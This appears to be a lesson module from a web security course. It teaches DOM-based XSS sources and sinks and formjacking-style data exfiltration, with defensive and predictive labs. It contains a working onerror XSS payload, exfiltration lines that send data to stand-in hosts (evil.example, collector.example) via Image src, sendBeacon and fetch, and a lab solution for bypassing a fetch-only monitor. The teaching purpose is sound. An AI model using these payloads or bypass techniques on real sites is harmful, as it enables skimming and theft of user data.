const XSS_SITE = `<div class="card"><h3>Welcome</h3><div id="greeting"></div></div>`;
// A malformed data: URI fails to decode as an image WITHOUT ever making a network
// request (data: URIs are resolved locally) — a real, working onerror-XSS payload
// that stays entirely inside the "no real network calls" sandbox guarantee.
const XSS_SETUP = `location.hash = '#<img src="data:," onerror="window.__xssFired=true">';
`;
const XSS_BUGGY = `var name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').innerHTML = "Hello, " + name + "!";
`;
// The <img>'s onerror fires asynchronously (image decode failure), so this waits for
// it (or a short timeout, for the fixed version where no <img> exists at all) before
// reporting — checking synchronously would race the event and always read "not fired".
const XSS_TEST = `(function () {
  function finish() { __report({ xssFired: window.__xssFired === true }); }
  var img = document.querySelector('#greeting img');
  if (img) {
    img.addEventListener('error', function () { setTimeout(finish, 0); });
    img.addEventListener('load', function () { setTimeout(finish, 0); });
    setTimeout(finish, 200);
  } else {
    setTimeout(finish, 0);
  }
})();
`;

const MONITOR_SETUP = `window.fetch = function (url, options) {
  __securityAlert('high', 'Blocked fetch to ' + url, 'naive-monitor');
  return Promise.reject(new Error('blocked by naive-monitor'));
};
`;
const MONITOR_SKELETON = `// window.fetch is blocked entirely by the monitor above.
// Get the string "stolen-data" to https://collector.example/report
// using a DIFFERENT browser API instead.
`;
const MONITOR_TEST = `(function () {
  var arrived = __networkLog.some(function (e) {
    return e.api !== 'fetch' && e.url && e.url.indexOf('collector.example') !== -1;
  });
  __report({ arrived: arrived });
})();
`;

const EXAMPLE_SITE = `<div class="card"><div id="a"></div><div id="b"></div></div>`;
const EXAMPLE_CODE = `var untrusted = "<b>bold text</b>";

document.getElementById('a').innerHTML = untrusted;
document.getElementById('b').textContent = untrusted;

console.log("a rendered as HTML:", document.getElementById('a').innerHTML);
console.log("b rendered as text:", document.getElementById('b').textContent);
`;

export default {
  id: 'formjacking-exfiltration',
  moduleId: 'client-side-attacks',
  title: 'Formjacking and Data Exfiltration',
  estimatedMinutes: 30,
  difficulty: 'core',
  prerequisites: ['third-party-js-execution'],
  relatedMissionIds: ['silent-skimmer'],
  skillTags: ['clientSideAttacks', 'webSecurity'],

  whyItMatters: {
    development: 'Any sink that turns a string into live HTML or executable code is a potential vulnerability the moment untrusted data reaches it — knowing exactly which APIs are sinks (and which are safe) is a permanent, load-bearing piece of knowledge.',
    security: 'Formjacking (Magecart-style skimming) is one of the most common real-world client-side attacks, and it always has the same shape: read from a sensitive source, exfiltrate through SOME outbound channel — the specific channel varies precisely to dodge whatever monitoring exists.',
    sourceDefense: 'You will be asked, directly, "how would you detect this" and "how would an attacker get around your detection" — this lesson is the concrete foundation both questions are built on.',
  },

  mentalModel: {
    explanation: 'A "sink" is any API that takes a string (or other value) and does something dangerous with it — `innerHTML`/`outerHTML`/`insertAdjacentHTML` parse it as HTML (and execute any script-equivalent content, like an `onerror` handler on an `<img>`); `document.write` does similarly; `eval`/`new Function`/string-argument `setTimeout` execute it as JavaScript. A "source" is anywhere untrusted data enters — URL parameters, `location.hash`, form input, a third-party API response. DOM-based XSS is simply untrusted data flowing from a source to a sink with no safe transformation in between. Exfiltration is the mirror image: once an attacker\'s code has data, it needs an OUTBOUND channel to get it out — and there are several independent ones (fetch, XHR, sendBeacon, image-beacon), which matters enormously for detection, because monitoring only one is not the same as monitoring exfiltration.',
    distinctions: [
      { label: 'Browser-provided', text: '`innerHTML`\'s HTML-parsing behavior and `fetch`/`sendBeacon`/`Image`\'s network behavior are all Web APIs/HTML-parsing rules defined by browser specifications, not ECMAScript — the language itself has no concept of "HTML" or "network request" at all.' },
      { label: 'Simplified model', text: '"XSS" is often talked about as one bug, but sinks differ meaningfully in risk: `textContent` is never a sink (it never parses HTML at all); `innerHTML` is dangerous with attacker-controlled strings; `eval`/`Function` are dangerous with ANY untrusted string, HTML or not.' },
      { label: 'Implementation detail', text: 'Exactly how aggressively a browser\'s HTML parser normalizes malformed markup (which can enable "mutation XSS," where sanitized-looking HTML becomes dangerous after a round-trip through the parser) varies subtly by engine — the safe rule of thumb (never feed untrusted strings to HTML-parsing sinks) holds regardless of these details.' },
    ],
  },

  example: {
    runner: 'iframe',
    code: EXAMPLE_CODE,
    siteSnapshot: EXAMPLE_SITE,
    predictPrompt: 'The same untrusted-looking string is inserted two ways. Predict what the DOM inspector will show for each element, and what the two console.log lines will print.',
  },
  panels: ['dom'],

  labs: [
    {
      id: 'repair-dom-xss',
      title: 'Defend: repair a DOM XSS sink',
      type: 'defend',
      instructions: 'The greeting reads a name from the URL fragment and renders it. A crafted fragment (already set up for you) currently executes. Fix the sink.',
      runner: 'iframe',
      submissionMode: 'code',
      siteSnapshot: XSS_SITE,
      setupScript: XSS_SETUP,
      initialCode: XSS_BUGGY,
      testScript: XSS_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0, security: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = runResult.returnValue?.xssFired === false;
        return { passed, score: { security: passed ? 1 : 0 }, feedback: [passed ? 'The payload no longer executes.' : 'The payload still executed — check the DOM inspector to see what actually got inserted.'] };
      },
      hints: [
        'The URL fragment is fully attacker-controlled (a user can be sent a link with anything after the #), and `innerHTML` parses whatever it\'s given as real HTML — including the `<img src=x onerror=...>` currently in there.',
        '`textContent` inserts a string as literal text, never parsed as markup — swap the sink and the same untrusted string becomes inert.',
      ],
      solution: `var name = decodeURIComponent(location.hash.slice(1));
document.getElementById('greeting').textContent = "Hello, " + name + "!";`,
      explanation: 'The vulnerability was never about `decodeURIComponent` or about `location.hash` specifically — it was that untrusted data reached an HTML-parsing sink at all. `textContent` isn\'t "safer innerHTML" — it\'s a fundamentally different operation that never interprets its input as markup, which is why it fully closes this class of bug rather than just making it harder to hit.',
    },
    {
      id: 'identify-exfil-channels',
      title: 'Predict: identify the exfiltration channel',
      type: 'predict',
      instructions: 'Match each snippet to the browser API it uses to send data out.',
      runner: 'none',
      submissionMode: 'answer',
      initialCode: '',
      sourceCode: `// Snippet 1
new Image().src = 'https://evil.example/c?d=' + data;

// Snippet 2
navigator.sendBeacon('https://evil.example/c', data);

// Snippet 3
fetch('https://evil.example/c', { method: 'POST', body: data });`,
      answerSchema: [
        { id: 's1', prompt: 'Snippet 1 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
        { id: 's2', prompt: 'Snippet 2 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
        { id: 's3', prompt: 'Snippet 3 uses:', type: 'select', options: ['fetch', 'XMLHttpRequest', 'navigator.sendBeacon', 'Image src (beacon)'] },
      ],
      validate(answers) {
        const correct = { s1: 'Image src (beacon)', s2: 'navigator.sendBeacon', s3: 'fetch' };
        const keys = Object.keys(correct);
        const matches = keys.filter((k) => answers[k] === correct[k]).length;
        const fraction = matches / keys.length;
        return { passed: fraction === 1, score: { correctness: fraction } };
      },
      hints: [
        'An `Image` object has no observable response — it\'s used purely to trigger a GET request as a side effect of setting `.src`.',
        '`sendBeacon` is designed specifically for fire-and-forget POSTs that survive page unload — a common choice for exfiltration right as a user navigates away.',
      ],
      solution: 'Snippet 1: Image src (beacon). Snippet 2: navigator.sendBeacon. Snippet 3: fetch.',
      explanation: 'All three genuinely send data to a remote host; they differ in ergonomics and detectability, not in fundamental capability — which is exactly why a monitor covering only one of them provides false confidence.',
    },
    {
      id: 'bypass-naive-monitor',
      title: 'Break it: find a channel the naive monitor misses',
      type: 'break',
      instructions: 'A security monitor blocks window.fetch entirely. Get the string "stolen-data" to https://collector.example/report using a channel it doesn\'t cover.',
      runner: 'iframe',
      submissionMode: 'code',
      siteSnapshot: '<div class="card">Monitor active.</div>',
      setupScript: MONITOR_SETUP,
      initialCode: MONITOR_SKELETON,
      testScript: MONITOR_TEST,
      validate(runResult) {
        if (runResult.error) return { passed: false, score: { correctness: 0 }, feedback: [`Error: ${runResult.error}`] };
        const passed = !!runResult.returnValue?.arrived;
        return { passed, score: { correctness: passed ? 1 : 0 }, feedback: [passed ? 'Data arrived through an unmonitored channel.' : 'No data reached the destination through anything other than fetch.'] };
      },
      hints: [
        'The monitor only touches `window.fetch` — every other network-capable API is completely untouched.',
        '`navigator.sendBeacon(url, data)` or `new Image().src = url + "?d=" + data` both reach the same destination without ever calling fetch.',
      ],
      solution: `navigator.sendBeacon('https://collector.example/report', 'stolen-data');`,
      explanation: 'This is the single most important lesson about runtime instrumentation: coverage of ONE API is not coverage of a CAPABILITY. "Block outbound requests" as a goal requires instrumenting every API that can make one — fetch, XMLHttpRequest, sendBeacon, and the Image-src beacon pattern, at minimum — not just the one an engineer happened to think of first.',
    },
  ],

  knowledgeCheck: [
    { id: 'kc-source-sink', question: 'Define "source" and "sink" in the context of DOM XSS, and explain why textContent is never a sink.', modelAnswer: 'A source is anywhere untrusted data enters the page (URL, form input, a third-party response). A sink is an API that does something dangerous with a string it\'s given. `textContent` is never a sink because it always treats its argument as literal text — it has no code path that parses or executes its input as HTML or JavaScript, unlike `innerHTML` (parses as HTML) or `eval` (executes as JS).', skillTag: 'clientSideAttacks' },
    { id: 'kc-why-powerful', question: 'Why is a compromised (or simply malicious) third-party script such a powerful attack vector compared to, say, a network-level attacker?', modelAnswer: 'It executes with full same-realm JavaScript privileges on the actual page — it can read live DOM state (including values a user has typed but not yet submitted), register its own listeners, and use any browser API the page itself could use — all without needing to intercept network traffic or defeat TLS. It\'s a first-class participant in the page\'s own execution, not an outside observer.', skillTag: 'clientSideAttacks' },
    { id: 'kc-coverage', question: 'A monitor blocks fetch and XMLHttpRequest but not sendBeacon or Image. Is that monitor "detecting exfiltration"? What would you tell someone who thought it was sufficient?', modelAnswer: 'No — it\'s detecting two specific APIs, not the general capability of "sending data out." Any script (malicious or just testing the boundary) can trivially exfiltrate through sendBeacon or an image-src beacon and never trip it. Comprehensive coverage requires instrumenting every network-capable API, not the subset that happened to come to mind first.', skillTag: 'runtimeInstrumentation' },
  ],

  interviewQuestions: [
    'Define DOM-based XSS in terms of sources and sinks, with a concrete example of each.',
    'Name at least three distinct browser APIs an attacker could use to exfiltrate data, and explain why monitoring only one is insufficient.',
    'Why can a compromised third-party script access data a network-level attacker cannot, even over an unencrypted connection?',
  ],
};
